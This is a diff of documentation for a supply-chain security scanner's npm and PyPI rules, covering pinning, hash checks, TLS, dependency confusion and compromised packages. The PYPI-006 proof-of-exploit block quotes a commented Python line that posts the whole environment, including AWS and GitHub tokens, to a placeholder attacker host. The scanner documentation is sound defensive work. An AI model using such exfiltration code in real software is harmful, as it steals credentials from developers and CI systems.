+- Shai-Hulud npm worm (2026): the postinstall in compromised packages scraped credentials and pushed propagation workflow files. ``ignore-scripts=true`` neutralizes the postinstall primitive at install time — the worm cannot execute its first stage if scripts are disabled.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: .npmrc carries the npm default (scripts run).
+# A transitive dep with a malicious postinstall (Shai-Hulud,
+# TanStack, ua-parser-js 2021) executes with the developer's
+# or CI runner's environment on the next ``npm install``.
+registry=https://registry.npmjs.org/
+# (ignore-scripts not declared — defaults to running scripts)
+
+# Safe: explicit ignore-scripts=true. Postinstall on every
+# dep is suppressed at install time. Native modules that
+# genuinely need a build (better-sqlite3, sharp) get
+# rebuilt explicitly after the install:
+registry=https://registry.npmjs.org/
+ignore-scripts=true
+# Then in the install script:
+#   npm ci
+#   npm rebuild better-sqlite3 sharp
+```
+
+**Source:** [`NPM-007`](../providers/npm.md) in the [npm provider](../providers/npm.md).
+
 ### `OCI-001`: Image manifest is missing OCI provenance annotations <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-oci-001 }
 
 **Evidences:** [`REB-3`](#ctrl-reb-3) L4: Generate SBOMs for artifacts produced.
@@ -3198,6 +3519,132 @@ Detection scope: the config descriptor digest, every layer descriptor digest (si
 
 **Source:** [`OCI-008`](../providers/oci.md#oci-008) in the [OCI manifest provider](../providers/oci.md).
 
+### `PYPI-001`: requirements.txt entry missing an exact version pin <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-pypi-001 }
+
+**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).
+
+**How this is detected.** Fires on any requirement that does not use ``==`` to pin a single version, including:
+
+* Bare names (``requests``)
+* Range specifiers (``django>=4,<5``, ``urllib3~=2.0``)
+* Lone upper-bound (``packaging<24``)
+
+Skips VCS specs (``git+https://...``), URL specs (``https://example.com/foo.tar.gz``), editable installs (``-e .``), and local paths (``./packages/foo``) — those have different pinning shapes and are handled by PYPI-004 or fall outside the version-pinning surface. Complements PYPI-002 (hash pinning) and PYPI-004 (VCS commit pin); PYPI-001 is the version-name layer.
+
+**Recommendation.** Pin every requirement to an exact version (``foo==1.2.3``). Range specifiers (``>=``, ``~=``, ``<``) and unpinned names let pip pick a later release on the next install, so a compromised patch version (PyTorch typosquat, ctx package, request-PR worm) reaches the build without a code change. Generate the file with ``pip-compile`` to lock the full transitive set, and pair the pin with ``--require-hashes`` (PYPI-002) so the lock is verified at install time.
+
+**Known false positives.**
+
+- Files that are pip-tools *inputs* (``requirements.in``) carry unpinned ranges by design, the resolved ``*.txt`` is the artifact pip installs. If you're scanning a ``*.in`` file intentionally, suppress with a rationale naming the compiled output.
+
+**Source:** [`PYPI-001`](../providers/pypi.md) in the [PyPI provider](../providers/pypi.md).
+
+### `PYPI-002`: requirements.txt missing hash pinning (--require-hashes / --hash=) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-pypi-002 }
+
+**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).
+
+**How this is detected.** Fires when:
+
+* The file does not declare ``--require-hashes`` at the top, AND
+* At least one requirement line is missing a ``--hash=...`` flag.
+
+When ``--require-hashes`` is present, pip enforces hash pinning for every requirement and itself refuses the install if any line is missing a ``--hash``; the rule still flags any line that visibly lacks the flag so the doc reader sees the actual coverage. ``*.in`` (pip-tools input) files are exempt — they're declarative inputs, the compiled ``*.txt`` is the hash-bearing artifact pip installs. Complements PYPI-001 (version pin); PYPI-002 is the layer that catches an attacker swapping the artifact even when the version literal is unchanged.
+
+**Recommendation.** Regenerate the file with ``pip-compile --generate-hashes`` (pip-tools) or ``pip hash`` and add ``--require-hashes`` at the top. Every requirement line then carries one or more ``--hash=sha256:...`` entries pinning the artifact bytes pip downloads. ``--require-hashes`` forces pip to refuse installs that don't match, closing the window where a compromised registry (or a malicious mirror, or a MITM on an internal proxy) swaps the tarball/wheel without your lockfile changing.
+
+**Known false positives.**
+
+- Files generated by ``poetry export`` historically wrote hashes without ``--require-hashes`` at the top, which looks unpinned but is enforced by Poetry's own resolver in CI. Add the top-level ``--require-hashes`` to the exported file (or replace ``poetry export`` with ``pip-compile --generate-hashes``) so the requirements file is self-describing.
+
+**Seen in the wild.**
+
+- PyTorch dependency confusion (December 2022): the ``torchtriton`` name on PyPI was claimed by a malicious publisher and pulled in via a nightly build, exfiltrating SSH keys and ``/etc/passwd``. Hash pinning would have rejected the unexpected artifact regardless of which registry resolved the name.
+
+**Source:** [`PYPI-002`](../providers/pypi.md) in the [PyPI provider](../providers/pypi.md).
+
+### `PYPI-003`: requirements.txt uses an HTTP index or disables TLS verification <span class="pg-sev pg-sev--high">HIGH</span> { #detail-pypi-003 }
+
+**Evidences:** [`ING-1`](#ctrl-ing-1) L1: Use package managers trusted by your organization.
+
+**How this is detected.** Fires when the file's top-level options include:
+
+* ``--index-url http://...`` / ``-i http://...``
+* ``--extra-index-url http://...``
+* ``--trusted-host <host>``
+
+Complements DF-021 (Dockerfile ``RUN pip install ``-i http://...``); PYPI-003 catches the same pattern when it's baked into the requirements file rather than the shell command. Note ``--trusted-host`` also weakens PYPI-002 — pip silently skips hash checking for the trusted host even when ``--require-hashes`` is set.
+
+**Recommendation.** Switch ``--index-url`` and ``--extra-index-url`` to ``https://`` and remove ``--trusted-host``. If your internal index has a self-signed certificate, install the CA into the build environment's truststore (or pass ``PIP_CERT=/path/to/ca.pem``) instead of telling pip to skip verification. ``--trusted-host`` disables TLS verification *and* hash verification for the named host, so anyone on the network path can swap the wheel.
+
+**Source:** [`PYPI-003`](../providers/pypi.md) in the [PyPI provider](../providers/pypi.md).
+
+### `PYPI-004`: requirements.txt VCS dependency uses a mutable ref <span class="pg-sev pg-sev--high">HIGH</span> { #detail-pypi-004 }
+
+**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).
+
+**How this is detected.** Fires on requirement lines whose URL is a VCS scheme (``git+https://``, ``git+ssh://``, ``hg+``, ``svn+``, ``bzr+``) and whose ``@<ref>`` segment is not a 40-character SHA. A line with no ``@<ref>`` at all also fires — that resolves to the default branch HEAD, the most mutable form. Note: ``foo @ git+https://...`` (PEP 508 direct URL) and ``-e git+https://...#egg=foo`` (legacy editable install) are both detected.
+
+**Recommendation.** Pin VCS requirements to a 40-character commit SHA: ``foo @ git+https://github.com/owner/repo.git@<sha>`` (or the legacy ``-e git+...@<sha>#egg=foo`` form). Branch and tag refs (``@main``, ``@v1.2.3``) are mutable, anyone with push access to the upstream repo can swap the contents of what your build pulls without changing the requirement line. A 40-char SHA is immutable. If the upstream isn't yours, prefer vendoring a fork into a private index and pinning by version + hash (PYPI-001 / PYPI-002).
+
+**Source:** [`PYPI-004`](../providers/pypi.md) in the [PyPI provider](../providers/pypi.md).
+
+### `PYPI-005`: requirements.txt declares --extra-index-url (dependency-confusion surface) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-pypi-005 }
+
+**Evidences:** [`ING-1`](#ctrl-ing-1) L1: Use package managers trusted by your organization.
+
+**How this is detected.** Fires when the file declares ``--extra-index-url`` at any level. The flag itself is the anti-pattern, the URL value doesn't matter, pip will query both the primary and the extra index for every package and pick the higher version. An attacker who registers a public PyPI package with the same name as an internal-only dependency wins the version comparison and ships their code into the build.
+
+If the extra index is a hash-locked internal proxy that serves *both* internal and mirrored-public packages, consolidating it into the primary ``--index-url`` removes the surface without losing any capability. Suppress with a rationale only when both indexes share an operator-controlled allow-list of names.
+
+**Recommendation.** Replace ``--extra-index-url`` with a single ``--index-url`` pointing at the index you actually want (an internal proxy or a curated private index), and configure that index to transparently mirror PyPI for any package not published internally. With ``--extra-index-url``, pip queries *both* indexes for every name and picks the highest version — so a public PyPI publisher who registers your internal package name (``acme-internal``) with a higher version wins the resolution. The single-index pattern eliminates the dependency-confusion vector entirely.
+
+**Seen in the wild.**
+
+- Alex Birsan, "Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies" (2021): internal package names harvested from public-facing manifests were registered on public PyPI / npm with higher version numbers; victim builds that declared the public index as an extra automatically pulled the attacker's package on the next install.
+- PyTorch ``torchtriton`` (December 2022): a typosquat name on PyPI's public index was preferred over the internal nightly build, exfiltrating SSH keys via a postinstall step. Single-index installations were unaffected.
+
+**Source:** [`PYPI-005`](../providers/pypi.md) in the [PyPI provider](../providers/pypi.md).
+
+### `PYPI-006`: requirements.txt pins a known-compromised PyPI package version <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-pypi-006 }
+
+**Evidences:** [`ING-3`](#ctrl-ing-3) L1: Have the capability to deny-list specific vulnerable / malicious OSS, [`SCA-3`](#ctrl-sca-3) L2: Scan OSS for malware.
+
+**How this is detected.** Walks every ``name==version`` line in the requirements file against the curated compromised-package registry in ``pipeline_check.core.checks.pypi._compromised_packages``. Name matching follows PEP 503 normalization (lowercase, underscore/dot folded to hyphen) so ``Pillow``, ``pillow``, and ``Pil_Low`` resolve to the same registry entry. Lines without an exact ``==`` pin can't be evaluated by this rule (the version literal isn't decidable from the file alone); those are PYPI-001's surface. VCS URLs and local / editable installs are skipped — they don't carry a registry-resolvable version. Registry is hand-curated and append-only; refresh by PR with the citing advisory.
+
+**Recommendation.** Rotate every secret reachable to any process that ran ``pip install`` against this requirements file during the window the compromised version was installed (AWS keys, GH tokens, SSH keys — most published PyPI compromises have been credential stealers). Bump the affected requirement to a post-incident clean version published after the maintainer / PyPI took down the malicious release, and audit CI logs for the exfiltration shape the advisory documents. Pair with PYPI-002 (``--require-hashes``) so a future swap of the same version literal fails verification.
+
+**Known false positives.**
+
+- The registry covers only public, advisory-confirmed compromises. Pre-disclosure compromises and yet-unpublished maintainer-account takeovers do not land until the citing advisory exists. For broader coverage, run ``pip-audit`` or ``osv-scanner`` alongside pipeline-check; PYPI-006 is the curated supply-chain anchor, not a vulnerability database.
+
+**Seen in the wild.**
+
+- ctx package compromise (May 2022): the abandoned ``ctx`` package was claimed by an attacker and republished with an env-var exfiltration payload targeting AWS keys / GitHub tokens. https://isc.sans.edu/diary/28772
+- requests-darwin-lite 2.27.1 ([GHSA-7gjg-3qcj-9jvg](https://github.com/advisories/GHSA-7gjg-3qcj-9jvg), May 2024): typosquat-flavored package whose wheel embedded the Geneva malware framework.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: requirements.txt pins a compromised version.
+ctx==0.2.2
+
+# Attack: ctx 0.2.2 carries a postinstall-equivalent at
+# wheel install time that exfiltrates the environment to
+# an attacker endpoint:
+#   import os, requests
+#   requests.post('https://<attacker>/c',
+#                 data=json.dumps(dict(os.environ)))
+# AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, GITHUB_TOKEN,
+# and every other CI-env credential go out in one POST.
+
+# Safe: do not install ctx 0.2.2-0.2.8; if you genuinely
+# need a ``ctx``-named package, vendor a fork at a known-
+# good revision into a private index and pin by hash
+# (PYPI-002).
+```
+
+**Source:** [`PYPI-006`](../providers/pypi.md) in the [PyPI provider](../providers/pypi.md).
+
 ### `SIGN-001`: No AWS Signer profile defined for Lambda deploys <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-sign-001 }
 
 **Evidences:** [`REB-2`](#ctrl-reb-2) L4: Digitally sign rebuilt / produced OSS artifacts.
@@ -3283,24 +3730,6 @@ Detection scope: the config descriptor digest, every layer descriptor digest (si
 **Recommendation.** Add a vulnerability scanner step. ``trivy fs $(workspaces.src.path)`` for source / filesystem; ``trivy image <ref>`` for container images. The official Tekton catalog ships ``trivy-scanner`` and ``grype-scanner`` Tasks if you'd rather reference one. Fail the step on findings above a chosen severity so a regression blocks the merge instead of shipping.
 
 **Source:** [`TKN-012`](../providers/tekton.md#tkn-012) in the [Tekton provider](../providers/tekton.md).
-
-## Mapped check IDs not found in the rule registry
-
-The standards data references check IDs the scanner does not ship. The mapping is preserved for forward-compat; once the rule lands the row will fill in automatically.
-
-- `NPM-001`
-- `NPM-002`
-- `NPM-003`
-- `NPM-004`
-- `NPM-005`
-- `NPM-006`
-- `NPM-007`
-- `PYPI-001`
-- `PYPI-002`
-- `PYPI-003`
-- `PYPI-004`
-- `PYPI-005`
-- `PYPI-006`
 
 ---
 
